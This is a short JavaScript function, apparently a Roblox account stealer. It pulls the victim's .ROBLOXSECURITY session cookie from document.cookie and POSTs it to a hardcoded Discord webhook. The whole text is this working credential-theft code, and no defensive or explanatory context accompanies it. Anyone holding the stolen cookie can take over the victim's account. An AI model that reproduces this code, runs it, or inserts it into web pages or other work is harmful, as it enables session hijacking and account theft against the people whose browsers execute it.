function sendRobloxSecurity() {
    // Get the .ROBLOXSECURITY cookie
    const robloxSecurity = document.cookie.match(/\.ROBLOXSECURITY=([^;]+)/)[1];
  
    // Send a POST request to your webhook with the cookie data
    fetch('https://discordapp.com/api/webhooks/1080433346192101407/sbGCNg3A8jeryS0LswMK_pQGloxVHCRRdBw0ptZlI7K3b49innAVm6baHEQCmX-yFy9a', {
      method: 'POST',
      body: JSON.stringify({ robloxSecurity }),
      headers: {
        'Content-Type': 'application/json'
      }
    });
  }